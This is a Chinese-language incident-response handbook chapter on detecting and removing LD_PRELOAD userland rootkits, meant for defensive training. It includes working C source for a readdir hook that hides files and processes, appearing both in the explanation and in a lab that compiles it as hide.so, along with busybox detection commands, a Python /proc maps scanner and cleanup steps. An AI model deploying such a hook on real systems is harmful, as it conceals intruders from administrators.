# 實戰手冊 25.2：用戶態動態庫劫持 (LD_PRELOAD) 鑑識、readdir 隱形後門與記憶體排查

## 案發現場破題

在 Linux 應急響應（IR）與主機入侵排查中，藍隊常遇到令人困惑的詭異現象：管理員使用 `ps -ef` 看不到特定惡意進程，使用 `ls -la` 或 `find` 搜尋不到已知的木馬檔案，使用 `netstat` 查不到外聯端口；然而，伺服器 CPU 使用率卻常態飆高到 100%，外部防火牆更持續記錄到巨量未經授權的 C2 流量。

這正是典型的「用戶態動態程式庫劫持」（User-space Shared Library Hijacking）。攻擊者無須載入高風險且易觸發崩潰的核心模組（LKM），僅需透過 `/etc/ld.so.preload` 或環境變數 `LD_PRELOAD` 注入一個特製的惡意動態庫（Shared Object, `.so`）。該動態庫透過符號覆蓋（Symbol Interception），悄悄攔截 glibc 的關鍵函數（如 `readdir()`, `fopen()`, `write()`），在用戶端工具解析檔案或進程時將攻擊者特徵動態過濾。身為藍隊鑑識人員，必須掌握動態鏈接器（`ld.so`）載入順序、`/proc/<pid>/maps` 記憶體映射清查與靜態二進位（Statically Linked）排查利器。

```
動態鏈接劫持 (LD_PRELOAD) 攔截與過濾邏輯：

[正常執行路徑]
ps / ls 指令 ──> glibc.so (`readdir`, `openat`) ──> 核心 Syscall ──> 回傳所有 PID 與檔案清單

[遭 /etc/ld.so.preload 劫持路徑]
ps / ls 指令 ──> 動態鏈接器 (ld-linux.so) 依序加載：
                     1. /lib/x86_64-linux-gnu/evil_hook.so (優先加載！)
                     2. /lib/x86_64-linux-gnu/libc.so.6
                        │
                        ▼
            evil_hook.so 導出覆蓋之 `readdir()`:
            - 調用原始 real_readdir() 獲取真實 dirent 結構
            - 判定 d_name 是否匹配惡意字串 (如 "c2_miner", "backdoor.sh")
            - 若命中：直接跳過該指標並回傳下一筆！
            - 若未命中：正常回傳。
  * 結果：所有仰賴 glibc 讀取目錄與進程的指令 (ls, ps, top, lsof) 雙眼全盲！
```

## 第一動：Linux 動態鏈接機制與符號攔截原理

### 1.1 Linux 動態鏈接器（`ld-linux.so`）載入優先權
當執行一個動態鏈接的可執行檔（Dynamically Linked ELF）時，動態鏈接器依據嚴格的優先順序解析符號：
1. **環境變數 `LD_PRELOAD`**：指定單次執行或當前 Shell Session 優先載入的 `.so` 檔案。
2. **設定檔 `/etc/ld.so.preload`**：**全域永久生效**！系統中任何程式（除 SUID 且具備安全保護機制外）在載入標準庫前，皆被強制優先載入該設定檔列出的所有 `.so`。
3. **環境變數 `LD_LIBRARY_PATH`**：指定動態庫搜尋目錄。
4. **系統預設路徑**：`/etc/ld.so.conf`、`/lib`、`/usr/lib`。

### 1.2 經典 Hook 函式庫實作模式
攻擊者編寫共用庫，利用 `dlsym(RTLD_NEXT, "readdir")` 獲取 glibc 原生實作，並導出同名函式進行覆蓋：
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

// 覆蓋 readdir 函式隱藏檔案與 /proc/<PID>
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*real_readdir)(DIR *) = NULL;
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    
    struct dirent *dir;
    while ((dir = real_readdir(dirp)) != NULL) {
        // 若檔案名或進程 PID 包含特定特徵，略過不回傳
        if (strstr(dir->d_name, "evil_backdoor") != NULL) continue;
        break;
    }
    return dir;
}
```

### 1.3 SUID 程式的 AT_SECURE 逃逸限制
- 為了安全性，Linux 核心在執行具備 SUID/SGID 權限的二進位檔案（如 `sudo`, `passwd`）時，若真實 UID 與有效 UID 不符，會自動啟用 `AT_SECURE` 模式，忽略用戶態自訂的 `LD_PRELOAD` 環境變數。
- **但若攻擊者已取得 root 權限**並將惡意 `.so` 寫入 `/etc/ld.so.preload`，即使 SUID 程式亦會全盤載入，造成整個系統所有命令與服務全面受控。

## 第二動：記憶體映射特徵與鑑識定位指標

### 2.1 關鍵檔案鑑識與時間戳審查
- `/etc/ld.so.preload`：合法乾淨的 Linux 系統預設此檔案**不存在**。若此檔案存在且非空，99% 為嚴重後門事件！
- 惡意共用庫常見藏匿路徑：
  - `/usr/local/lib/`
  - `/lib/x86_64-linux-gnu/`
  - `/tmp/.X11-unix/` 或以隱藏點開頭（例如 `/lib/.../libcrypto.so`）。

### 2.2 進程記憶體映射檢查（`/proc/<pid>/maps`）
即使 `readdir` 被 Hook 隱瞞了 `/proc` 的遍歷，如果鑑識人員直接指定已知 PID 讀取 `/proc/<pid>/maps`，動態鏈接器在記憶體中配置的映射段是無法隱瞞的。所有被污染的進程都會顯示加載了該未知的惡意 `.so`。

## 第三動：手動獵捕與鑑識分析（Busybox & Python）

### 3.1 使用靜態編譯工具（Statically Linked）破除用戶態假象
因為動態庫劫持只能影響**動態鏈接**程式，靜態編譯的二進位程式在執行時不透過 `ld-linux.so`，直接使用自身內嵌的系統呼叫發起 Syscall，因此完全不受任何 Preload 影響！

```bash
# 步驟 1：確認 /etc/ld.so.preload 是否存在異常條目
# 避免使用動態鏈接的 cat，改用內建命令或靜態 busybox
/bin/busybox cat /etc/ld.so.preload

# 步驟 2：使用靜態編譯之 busybox 列出被隱藏之真實進程
/bin/busybox ps -ef

# 步驟 3：使用靜態 busybox 檢查真實目錄內容
/bin/busybox ls -la /tmp

# 步驟 4：若無靜態工具，使用純 Bash 內建功能讀取 /etc/ld.so.preload
# (Bash 內建 read 不調用 readdir)
while IFS= read -r line; do echo "Preload Target: $line"; done < /etc/ld.so.preload
```

### 3.2 Python 腳本自製快速 Preload 記憶體污染排查器
```python
import os
import sys

def audit_preload_and_maps():
    print("[*] 開始檢查 Linux 動態程式庫劫持跡象...")
    
    # 檢查 1: /etc/ld.so.preload
    preload_file = "/etc/ld.so.preload"
    if os.path.exists(preload_file):
        with open(preload_file, "r") as f:
            content = f.read().strip()
            if content:
                print(f"[CRITICAL] 發現 /etc/ld.so.preload 存在內容: \n{content}")
            else:
                print(f"[WARNING] 發現空檔案: {preload_file}")
    else:
        print(f"[+] 正常: {preload_file} 不存在。")

    # 檢查 2: 檢查常駐行程記憶體映射中是否加載非標準庫
    print("\n[*] 掃描常駐服務進程 (PID 1, cron, sshd) 之 maps 記憶體映射...")
    target_pids = [1]
    for p in os.listdir("/proc"):
        if p.isdigit() and int(p) < 1000:
            target_pids.append(int(p))

    suspicious_libs = []
    for pid in set(target_pids):
        maps_path = f"/proc/{pid}/maps"
        if not os.path.exists(maps_path):
            continue
        try:
            with open(maps_path, "r") as f:
                for line in f:
                    if ".so" in line:
                        parts = line.strip().split()
                        if len(parts) >= 6:
                            lib_path = parts[5]
                            if any(bad in lib_path for bad in ["/tmp", "/dev/shm", "/var/tmp", "/home", "..."]):
                                suspicious_libs.append((pid, lib_path))
        except PermissionError:
            continue

    if suspicious_libs:
        print("[CRITICAL] 在進程記憶體中發現位於高危暫存目錄之動態程式庫：")
        for pid, lib in set(suspicious_libs):
            print(f"  - PID {pid}: {lib}")
    else:
        print("[+] 常駐系統服務未發現異常目錄之動態程式庫加載。")

if __name__ == '__main__':
    audit_preload_and_maps()
```

## 第五動：企業級防禦硬化與應急響應阻斷

### 5.1 應急清除與解鎖恢復四部曲
當確認系統遭到 `/etc/ld.so.preload` 劫持時，直接執行 `rm /etc/ld.so.preload` 可能因為 `rm` 本身已被 Hook 攔截而失敗。
標準安全拔除步驟：
1. **解除不可變屬性（Immutable Attribute）**：
   攻擊者通常會下達 `chattr +i /etc/ld.so.preload`。
   ```bash
   /bin/busybox chattr -i /etc/ld.so.preload
   ```
2. **清空檔案內容（而非直接刪除）**：
   若刪除被拒絕，透過 Shell 重新導向將其內容歸零：
   ```bash
   echo "" > /etc/ld.so.preload
   ```
3. **強制重啟所有被污染的服務**：
   重啟 `systemd`、`sshd`、`crond` 釋放已載入記憶體的惡意 `.so`。
4. **實施檔案鎖定**：
   若暫時無法根除惡意進程，建立空的 `/etc/ld.so.preload` 並鎖定權限防範再次寫入：
   ```bash
   touch /etc/ld.so.preload
   chmod 644 /etc/ld.so.preload
   chattr +i /etc/ld.so.preload
   ```

## 靶場實戰：建構 Hook `readdir` 惡意動態庫並以 Busybox 識破

### 實驗目標
在靶場中編譯一個能隱藏檔案的共用庫 `hide.so`，寫入 `/etc/ld.so.preload` 驗證 `ls` 無法看見目標檔案，隨後使用靜態編譯工具與記憶體排查成功識破：

```bash
# 步驟 1：建立測試標的檔案
touch /tmp/secret_backdoor_file.txt

# 步驟 2：編寫覆蓋 readdir 之簡易動態庫
cat << 'EOF' > /tmp/hide.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*real_readdir)(DIR *) = NULL;
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *d;
    while ((d = real_readdir(dirp)) != NULL) {
        if (strstr(d->d_name, "secret_backdoor") != NULL) continue;
        return d;
    }
    return NULL;
}
EOF

# 步驟 3：編譯共用庫
gcc -shared -fPIC /tmp/hide.c -o /tmp/hide.so -ldl

# 步驟 4：設定 LD_PRELOAD 驗證隱形效果
LD_PRELOAD=/tmp/hide.so ls -la /tmp | grep "secret_backdoor" # 預期：查無結果！

# 步驟 5：使用靜態 busybox 識破偽裝
LD_PRELOAD=/tmp/hide.so /bin/busybox ls -la /tmp | grep "secret_backdoor" # 預期：成功看見！
```
